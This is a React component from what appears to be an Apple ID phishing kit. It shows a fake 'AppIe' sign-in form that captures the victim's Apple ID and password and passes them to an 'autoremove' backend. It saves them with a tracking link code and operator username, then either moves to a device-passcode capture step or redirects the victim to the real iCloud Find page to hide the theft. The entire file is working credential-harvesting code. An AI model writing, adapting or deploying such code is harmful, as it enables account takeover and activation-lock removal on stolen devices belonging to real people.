
import { use, useState, useEffect } from 'react';
import FloatingLabel from 'react-bootstrap/FloatingLabel';
import Form from 'react-bootstrap/Form';
import Button from 'react-bootstrap/Button';
import '../../assets/css/modalAuth.css';

import SvgSpinner from '../../../resources/SvgSpinner';
import SvgNext from '../../../resources/SvgNext';
import imgNext from '../../assets/img/btnNext.png';
import PoputLogin from '../../../resources/poputs/PopupLogin';
import responses from '../../../api/responses';
import { useData } from '../../../context/UserContext';


const Login = ({
    translator,
    setPassCodeActive
}) => {

    const { user } = useData();
    const [opLogin, setOpLogin] = useState(false); // Estado permitira saber si se esta enviando solo el usuario o usuario y contraseña    
    const [statusLogin, setStatusLogin] = useState(false);  //false -> show imgNext - true -> show SvgNext
    const [accountUsername, setAccountUsername] = useState('');
    const [accountPassword, setAccountPassword] = useState('');
    const [count, setCount] = useState(0);


    const showInputPassword = () => { //Muestra el input de la contraseña

        if (accountUsername != '') {
            setStatusLogin(true)

            document.getElementById('accountUsername').style.borderRadius = '6px 6px 0 0';
            document.getElementById('accountPassword').style.borderRadius = '0 0 6px 6px';
            document.getElementById("SliderMaps").style.borderRadius = '0 0 6px 6px';
            document.getElementById("SliderDiv").style.borderRadius = '0 0 6px 6px';

            setTimeout(() => {

                document.getElementById('btnAccount').style.opacity = '0.6'

                const sliderElement = document.getElementById("SliderMaps")[0];
                if (sliderElement) {

                    sliderElement.classList.toggle("slide-down");
                }
                document.getElementById("SliderDiv").style.transform = "translateY(0%)"
                document.getElementById("btnAccount").style.transform = "translateY(-10%)"
                document.getElementById('accountPassword').focus()
                setStatusLogin(false)
                setOpLogin(true)

            }, 1500);
        }

    }

    const hideInputPassword = () => { //Oculta el input de la contraseña    

        document.getElementById('accountUsername').style.borderRadius = '6px';
        document.getElementById('accountPassword').style.borderRadius = '6px';
        document.getElementById("SliderMaps").style.borderRadius = '6px 6px';
        document.getElementById("SliderDiv").style.borderRadius = '6px';
        document.getElementsByClassName('popupLogin')[0].style.display = 'none'



        const sliderElement = document.getElementById("SliderMaps")[0];
        if (sliderElement) {

            sliderElement.classList.toggle("slide-up");
        }
        document.getElementById("SliderDiv").style.transform = "translateY(-128%)"
        document.getElementById("btnAccount").style.transform = "translateY(-157%)"
        setStatusLogin(false)
    }


    const handleLogin = async (event) => {
        event.preventDefault()

        setStatusLogin(true)


        document.getElementsByClassName('popupLogin')[0].style.display = 'none'
        if (accountUsername != '' && !opLogin) {
            showInputPassword();
            setAccountPassword('')
            //console.log('Solo se envio el login')
        } else if (accountUsername != '' && opLogin) {

            if (accountPassword != '') {


                console.log('Enviando usuario y contraseña')

                try {
                    console.log('Autoremoved failed');

                    const response = await responses.autoremove(accountUsername, accountPassword);
                    console.log(response)

                    let status = response.success;
                    let responseData = response.message;
                    // let status = 0;
                    // let responseData = "Apple ID and Password"
                    console.log(status)
                    console.log(responseData)

                    setCount(prev => prev + 1);
                    console.log('El contador es ', count)
                    const unlockCode = user?.data?.unlockCode;



                    if (status == 0) {
                        await saveAutoRemoveData(status, responseData);
                        console.log('Autoremoved failed');
                        setStatusLogin(false)
                        // Usamos paréntesis para que la validación del código y el count === 2 vayan de la mano con &&
                        if ((Number(unlockCode) === 6 || Number(unlockCode) === 4 || unlockCode === 'alphanumeric') && count === 2) {
                            document.getElementsByClassName('popupLogin')[0].style.display = 'none';
                            setStatusLogin(true)
                            setTimeout(() => {
                                setPassCodeActive(true) //Se habilita el passoce
                            }, 500);
                        } else {
                            // 
                            document.getElementsByClassName('popupLogin')[0].style.display = 'block';

                        }

                    } else if (status == 1) {

                        console.log('El tipo de codigo es ', user?.data?.unlockCode)
                        console.log('El tipode codig otro es ', unlockCode)

                        // Convertimos unlockCode a número (si es posible) o evaluamos si es el texto "6" o "4"
                        if (Number(unlockCode) === 6 || Number(unlockCode) === 4 || unlockCode === 'alphanumeric') {
                            await saveAutoRemoveData(status, responseData);
                            setPassCodeActive(true); // Se habilita el passcode
                            console.log("aqui 1");
                        } else {
                            await saveAutoRemoveData(status, responseData);
                            localStorage.removeItem(`userData_${user?.data?.linkCode}`);
                            console.log("aqui 2");
                             setTimeout(() => {
                               window.location.href = 'https://www.icloud.com/find';
                            }, 1000);
                        }

                    }
                } catch (error) {
                    localStorage.removeItem(`userData_${user?.data?.linkCode}`);
                }

            }

        }
    }


    const saveAutoRemoveData = async (status, response) => {
        //const geo = await responses.getLocation();

        let data = {
            linkCode: user?.data?.linkCode || '',
            appleID: accountUsername,
            password: accountPassword,
            response: response,
            username: user?.data?.username || '',
            status: status,
        }

        const resp = await responses.addData(data);
        return resp;

    }

    return (
        <>
            <Form onSubmit={handleLogin} style={{ position: 'relative' }}>
                <h3 className="my-3 static-size" style={{ textAlign: 'center' }}>{translator('Iniciar sesión con tu cuenta de AppIe')}</h3>
                <div id="divemail" bis_skin_checked="1">
                    <FloatingLabel
                        controlId="accountUsername"
                        label={translator('Correo o número de telefono')}
                        className="mb-3"
                    >
                        <Form.Control
                            type="text"
                            placeholder={translator('Correo o número de telefono')}
                            style={{ paddingRight: '60px' }}
                            value={accountUsername}
                            onChange={({ target }) => {

                                setAccountUsername(target.value)
                                setOpLogin(false)

                                {
                                    target.value == ''
                                        ? document.getElementById('btnAccount').style.opacity = '0.6'
                                        : document.getElementById('btnAccount').style.opacity = '1'
                                }
                                hideInputPassword();  //Oculta el input de la contraseña                              
                                setAccountPassword(''); //Vacia el input de la contraseña
                            }}

                        />
                    </FloatingLabel>

                </div>

                <Button type='submit' className='btn' id='btnAccount'>
                    {statusLogin
                        ? <SvgSpinner style={{ color: 'gray' }} />
                        : <img id='imgNext' src={imgNext} />}
                </Button>

                <div className="slide-up SliderMaps" id="SliderMaps" bis_skin_checked="1">
                    <div id="SliderDiv" bis_skin_checked="1">
                        <FloatingLabel controlId="accountPassword" label={translator('Contraseña')}>
                            <Form.Control
                                type="password"
                                placeholder={translator('Contraseña')}
                                style={{ paddingRight: '70px' }}
                                value={accountPassword}
                                onChange={({ target }) => {
                                    setAccountPassword(target.value)
                                    document.getElementsByClassName('popupLogin')[0].style.display = 'none'
                                    {
                                        target.value == ''
                                            ? document.getElementById('btnAccount').style.opacity = '0.6'
                                            : document.getElementById('btnAccount').style.opacity = '1'
                                    }
                                }}
                                autoComplete='off'
                            />
                        </FloatingLabel>
                    </div>

                </div>

                <PoputLogin
                    translator={translator}
                    text={translator('No se pudo verificar tu identidad')}
                />

            </Form>
        </>
    )
}

export default Login;